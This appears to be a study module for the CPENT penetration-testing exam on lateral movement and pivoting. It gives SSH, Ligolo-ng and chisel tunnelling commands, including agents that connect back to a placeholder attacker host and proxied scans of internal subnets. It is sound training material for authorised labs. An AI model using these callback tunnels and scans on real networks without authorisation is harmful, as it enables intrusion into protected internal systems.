# Domain 11 · Lateral Movement & Pivoting

> Module 12. CPENT's signature challenge: segmented networks reachable only by chaining footholds. This is where many candidates lose time — and where disciplined operators win.

## Why it matters

Enterprises segment networks; the valuable hosts are never directly reachable. You must use each compromised host as a stepping-stone (a "pivot") to reach deeper subnets. CPENT explicitly includes **double (and deeper) pivoting** across many subnets.

## Core concepts

- **Port forwarding (local, `-L`):** expose a single remote port on your local machine.
- **Reverse forwarding (`-R`):** expose a local/attacker port on the remote side (useful when inbound to you is blocked).
- **Dynamic forwarding (`-D`) / SOCKS:** a proxy so *any* tool can reach the remote network via **proxychains**.
- **tun-based routing (Ligolo-ng):** create a virtual interface and route to the subnet natively — no proxychains gymnastics; cleanest for multi-hop.
- **Pivot graph:** keep a written map of which host bridges to which subnet. Essential past depth 1.

## Methodology / workflow

1. **On every new host**, discover adjacency: `ip route`, `ip addr`, `arp -a`, `/etc/hosts`, `ifconfig`.
2. **Identify the next subnet** you can now reach that you couldn't before.
3. **Establish a tunnel** through this host into that subnet.
4. **Enumerate through the tunnel** (remember: SOCKS = full-connect scans only, `nmap -sT -Pn`).
5. **Compromise a host** in the new subnet → repeat from step 1 (this is the "double pivot").
6. **Maintain the map** and label each tunnel/port so you don't lose track.

## Techniques (with commands)

### SSH (no upload needed if you have SSH creds)
```bash
ssh -L 4445:10.2.0.5:445 user@pivot      # local: reach 10.2.0.5:445 via 127.0.0.1:4445
ssh -D 9050 user@pivot                    # dynamic SOCKS proxy on :9050
# then:
proxychains nmap -sT -Pn -p- 10.2.0.0/24
proxychains curl http://10.2.0.10:9090 -I
ssh -R 9001:127.0.0.1:9001 user@pivot     # reverse (callback through pivot)
```
Configure `/etc/proxychains4.conf`: `socks5 127.0.0.1 9050`.

### Ligolo-ng (recommended for multi-hop)
```bash
# attacker: set up tun + listener
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
# on pivot host (agent), connect back:
./agent -connect ATTACKER_IP:11601 -ignore-cert
# in proxy console: session -> start_tunnel; add route to the new subnet
sudo ip route add 10.2.0.0/24 dev ligolo
# now your tools hit 10.2.0.0/24 directly — double pivot = chain a second agent/route
```

### Chisel (SOCKS over HTTP — good when only web egress works)
```bash
# attacker (server)
./chisel server -p 8080 --reverse
# pivot (client) -> reverse SOCKS
./chisel client ATTACKER:8080 R:socks
proxychains nmap -sT -Pn 10.2.0.0/24
```

### Windows pivot helper
- `plink.exe -L ...` for SSH forwarding from Windows; `netsh interface portproxy` for native forwards.

## Tools & usage

| Tool | Best for | Note |
|---|---|---|
| **SSH** (`-L/-R/-D`) | quick forwards when creds exist | universal, no upload |
| **Ligolo-ng** | clean multi-hop, native routing | modern favorite; no proxychains |
| **chisel** | HTTP/WebSocket SOCKS | when only web egress allowed |
| **proxychains4** | run any tool via SOCKS | `-sT -Pn` scans only |
| **sshuttle** | "VPN over SSH" for a subnet | simple subnet routing |
| **Metasploit autoroute/socks** | pivot from a meterpreter session | |

## Common pitfalls

- Trying SYN scans (`-sS`) through SOCKS — must use full-connect (`-sT -Pn`).
- Losing the network map during deep pivots — **write it down**.
- Giving up when one tool stalls (e.g., a localhost quirk) — switch methods (SSH↔Ligolo↔chisel).
- Forgetting to re-run `ip route`/`arp` on each new host (you'll miss the next subnet).

## Exam relevance

Expect to chain through several subnets to reach the final targets/flags. Practice until a clean double pivot (and enumerating through it) is second nature — it's among the highest-value, most time-sensitive skills on the exam.

## MITRE / mapping

- `T1090` (Proxy: internal/multi-hop), `T1021` (Remote Services), `T1572` (Protocol Tunneling).

## Practice

- TryHackMe **Wreath**; HTB **Pivotapi**/**Reddish**; the multi-subnet [`lab/vagrant/Vagrantfile`](../../lab/vagrant/Vagrantfile) in this repo.
- HTB Academy **Pivoting, Tunneling & Port Forwarding**.

## Self-check

- [ ] I can set up `-L`, `-R`, and `-D` SSH tunnels from memory.
- [ ] I can route to a second subnet with Ligolo-ng and enumerate it.
- [ ] I can perform and document a double pivot without losing the map.
